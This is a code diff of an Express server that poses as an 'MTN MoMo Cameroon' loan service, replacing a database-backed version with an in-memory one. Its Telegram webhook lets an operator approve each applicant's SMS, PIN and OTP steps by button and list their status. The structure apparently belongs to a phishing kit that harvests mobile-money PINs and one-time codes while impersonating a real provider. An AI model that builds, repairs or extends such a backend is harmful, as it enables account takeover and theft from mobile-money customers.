-        .then(({ rows }) => {
-            if (!rows.length) return res.json({ ok: true, loggedIn: false });
-            const a = rows[0];
-            res.json({
-                ok: true, loggedIn: true,
-                user: { id: a.id, fullName: a.full_name, email: a.email, phoneMasked: maskPhone(a.phone), status: a.status }
-            });
-        })
-        .catch(() => res.json({ ok: true, loggedIn: false }));
-});
-
-app.post('/api/logout', (req, res) => {
-    res.cookie('momo_session', '', { httpOnly: true, expires: new Date(0), path: '/' });
-    res.json({ ok: true });
-});
-
-app.get('/api/dashboard', requireSession, async (req, res) => {
-    try {
-        const a = req.appRow;
-        const monthly = Math.ceil(a.loan_amount / a.loan_term);
-
-        const tx = await pool.query(
-            `SELECT id, type, amount, description, created_at FROM transactions
-             WHERE application_id = $1 ORDER BY created_at DESC LIMIT 20`,
-            [a.id]
-        );
-        const totalRepaid = tx.rows.filter(t => t.type === 'repayment').reduce((s, t) => s + Number(t.amount), 0);
-
-        res.json({
-            ok: true,
-            loan: {
-                id: a.id,
-                amount: a.loan_amount,
-                term: a.loan_term,
-                monthlyPayment: monthly,
-                balance: Math.max(0, a.loan_amount - totalRepaid),
-                paidSoFar: totalRepaid,
-                status: a.status,
-                approvedAt: a.approved_at
-            },
-            user: { fullName: a.full_name, email: a.email, phoneMasked: maskPhone(a.phone) },
-            transactions: tx.rows
-        });
-    } catch (e) {
-        console.error('/api/dashboard:', e.message);
-        res.status(500).json({ ok: false, error: IS_DEV ? e.message : 'Erreur serveur.' });
-    }
-});
-
-app.get('/api/contract-pdf', requireSession, (req, res) => {
-    const a = req.appRow;
-    const monthly = Math.ceil(a.loan_amount / a.loan_term);
-    const doc = new PDFDocument({ size: 'A4', margin: 50 });
-    res.setHeader('Content-Type', 'application/pdf');
-    res.setHeader('Content-Disposition', `attachment; filename="momo-contract-${a.id}.pdf"`);
-    doc.pipe(res);
-    doc.fontSize(20).font('Helvetica-Bold').text('MTN MoMo Cameroon', { align: 'center' });
-    doc.fontSize(12).font('Helvetica').fillColor('#666').text('Loan Contract', { align: 'center' });
-    doc.moveDown(0.5);
-    doc.strokeColor('#FFCC00').lineWidth(3).moveTo(50, doc.y).lineTo(545, doc.y).stroke();
-    doc.moveDown(1);
-    const line = (l, v) => {
-        doc.font('Helvetica-Bold').fillColor('#333').fontSize(10).text(l + ':', { continued: true });
-        doc.font('Helvetica').fillColor('#000').text(' ' + (v || 'N/A'));
-    };
-    doc.font('Helvetica-Bold').fontSize(12).text('BORROWER'); doc.moveDown(0.3);
-    line('Application ID', a.id);
-    line('Full Name', a.full_name);
-    line('Email', a.email);
-    line('Phone', '+237 ' + a.phone);
-    doc.moveDown(0.8);
-    doc.font('Helvetica-Bold').fontSize(12).text('LOAN'); doc.moveDown(0.3);
-    line('Amount', xaf(a.loan_amount));
-    line('Term', a.loan_term + ' months');
-    line('Monthly', xaf(monthly));
-    line('Interest', '24% per year');
-    doc.moveDown(0.8);
-    doc.font('Helvetica-Bold').fontSize(12).text('NEXT OF KIN'); doc.moveDown(0.3);
-    line('Name', a.kin_name);
-    line('Phone', '+237 ' + a.kin_phone);
-    doc.moveDown(1);
-    doc.fontSize(9).fillColor('#888').text(`Generated ${new Date().toLocaleString('en-GB')}`, { align: 'center' });
-    doc.end();
-});
-
-// ═══════════════════════════════════════════════════════════
-// TELEGRAM WEBHOOK — 4-step admin approval
-// ═══════════════════════════════════════════════════════════
+// ─── Telegram Webhook ───
 app.post('/api/telegram-webhook', async (req, res) => {
-    res.status(200).send('ok');
-    try {
-        const u = req.body || {};
-        if (!u.callback_query) return;
-        const q = u.callback_query;
-        let data;
-        try { data = JSON.parse(q.data); } catch (e) { return; }
+  const update = req.body;
+  console.log('📩 Webhook received');
 
-        const action = data.a;
-        const step = data.s;
-        const id = data.id;
-        const approved = action === 'Y';
+  if (update.callback_query) {
+    const query = update.callback_query;
+    let data;
+    try { data = JSON.parse(query.data); }
+    catch (e) { console.error('Bad callback data:', query.data); return res.sendStatus(200); }
 
-        const { rows } = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
-        if (!rows.length) return;
-        const app_ = rows[0];
+    const { a, s, ref } = data;
+    let appId = null;
+    for (const id in applications) {
+      if (applications[id].ref === ref) { appId = id; break; }
+    }
+    if (!appId) { console.error('App not found for ref:', ref); return res.sendStatus(200); }
 
-        const expected = { application: 'application_review', sms: 'sms_pending', pin: 'pin_pending', otp: 'otp_pending' }[step];
-        if (app_.status !== expected) {
-            await tgSend(`⚠️ Ignored: ${step} but current status is ${app_.status}`);
-            return;
-        }
+    const app = applications[appId];
 
-        const adminName = (q.from && q.from.username) || String(q.from.id);
-
-        if (!approved) {
-            await pool.query(
-                `UPDATE applications
-                 SET status = 'rejected', rejection_reason = $2,
-                     admin_decision_by = $3, updated_at = NOW()
-                 WHERE id = $1`,
-                [id, `Rejected at ${step} step.`, adminName]
-            );
-            await tgSend(`❌ <b>REJECTED — ${step.toUpperCase()}</b>\n🆔 ${code(id)}\n👤 ${esc(app_.full_name)}`);
+    if (s === 'SMS') {
+      app.smsStatus = a === 'YES' ? 'approved' : 'rejected';
+    } else if (s === 'PIN') {
+      if (a === 'YES') {
+        app.pinStatus = 'approved';
+      } else {
+        app.pinAttempts = (app.pinAttempts || 0) + 1;
+        if (app.pinAttempts >= app.maxPinAttempts) {
+          app.pinStatus = 'blocked';
+          app.pinBlockedUntil = new Date(Date.now() + 30 * 60 * 1000).toISOString();  // 30 min
         } else {
-            const nextStatus = {
-                application: 'sms_pending',
-                sms: 'pin_pending',
-                pin: 'otp_pending',
-                otp: 'approved'
-            }[step];
-
-            await pool.query(
-                `UPDATE applications
-                 SET status = $2, user_submitted = FALSE,
-                     admin_decision_by = $3,
-                     approved_at = CASE WHEN $2 = 'approved' THEN NOW() ELSE approved_at END,
-                     updated_at = NOW()
-                 WHERE id = $1`,
-                [id, nextStatus, adminName]
-            );
-
-            if (nextStatus === 'approved') {
-                const monthly = Math.ceil(app_.loan_amount / app_.loan_term);
-                await pool.query(
-                    `INSERT INTO transactions (application_id, type, amount, description)
-                     VALUES ($1, 'disbursement', $2, 'Loan approved and disbursed')`,
-                    [id, app_.loan_amount]
-                );
-                await sendSms(app_.phone,
-                    `MTN MoMo: Your loan of XAF ${app_.loan_amount.toLocaleString()} has been approved. ` +
-                    `Funds will be deposited within 5 minutes. Ref: ${app_.id}`);
-                await sendApprovalEmail({
-                    to: app_.email, name: app_.full_name,
-                    loanAmount: app_.loan_amount, loanTerm: app_.loan_term,
-                    monthly, applicationId: app_.id
-                });
-                await tgSend(
-                    `🎉 <b>LOAN FULLY APPROVED</b>\n🆔 ${code(id)}\n` +
-                    `👤 ${esc(app_.full_name)}\n💰 ${xaf(app_.loan_amount)}\n\n` +
-                    `✅ SMS + Email sent to customer`
-                );
-            } else {
-                const labels = { sms_pending: 'SMS', pin_pending: 'PIN', otp_pending: 'OTP' };
-                await tgSend(
-                    `✅ <b>${step.toUpperCase()} APPROVED</b>\n🆔 ${code(id)}\n\n` +
-                    `→ Customer moves to <b>${labels[nextStatus]} step</b>`
-                );
-            }
+          app.pinStatus = 'rejected';
         }
-
-        await fetch(`${TG_API}/answerCallbackQuery`, {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ callback_query_id: q.id, text: approved ? 'Approved' : 'Rejected' })
-        }).catch(() => {});
-    } catch (e) {
-        console.error('Webhook:', e.message);
+      }
+    } else if (s === 'OTP') {
+      app.otpStatus = a === 'YES' ? 'approved' : 'rejected';
     }
-});
 
-// ═══════════════════════════════════════════════════════════
-// SPA FALLBACK + BOOT
-// ═══════════════════════════════════════════════════════════
-app.get('*', (req, res) => {
-    res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
-});
-
-(async () => {
-    try { await initSchema(); }
-    catch (e) {
-        console.error('❌ Schema init failed:', e.message);
-        console.error(e.stack);
-        process.exit(1);
-    }
-    app.listen(PORT, '0.0.0.0', () => {
-        console.log('═══════════════════════════════════════');
-        console.log(`🚀 MTN MoMo Cameroon v3.0.2`);
-        console.log(`   Port: ${PORT}`);
-        console.log(`   Base URL: ${APP_BASE_URL}`);
-        console.log(`   Telegram: ${TG_TOKEN ? 'set' : 'MISSING'}`);
-        console.log(`   Brevo: ${process.env.BREVO_API_KEY ? 'set' : 'MISSING'}`);
-        console.log('═══════════════════════════════════════');
+    await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ callback_query_id: query.id, text: `✅ ${a}` })
     });
-})();
+
+    await sendTelegramMessage(`Status Update (CAMEROON)\nID: ${appId}\nStep: ${s}\nAction: ${a}`);
+    return res.sendStatus(200);
+  }
+
+  if (update.message && update.message.text) {
+    const text = update.message.text.trim();
+    const chatId = update.message.chat.id;
+    if (chatId.toString() === TELEGRAM_CHAT_ID) {
+      if (text === '/stats') {
+        const total = Object.keys(applications).length;
+        await sendTelegramMessage(`Total applications: ${total}`);
+      } else if (text === '/list') {
+        const ids = Object.keys(applications).slice(-5);
+        let msg = 'Recent applications:\n';
+        ids.forEach(id => {
+          const app = applications[id];
+          msg += `${id} — SMS: ${app.smsStatus}, PIN: ${app.pinStatus}, OTP: ${app.otpStatus}\n`;
+        });
+        await sendTelegramMessage(msg || 'No applications yet.');
+      } else if (text === '/help') {
+        await sendTelegramMessage('Commands: /stats, /list');
+      }
+    }
+  }
+  res.sendStatus(200);
+});
+
+// ─── Fallback ───
+app.get('*', (req, res) => {
+  res.sendFile(path.join(frontendPath, 'index.html'));
+});
+
+app.listen(PORT, () => {
+  console.log(`🚀 Server running on port ${PORT}`);
+});
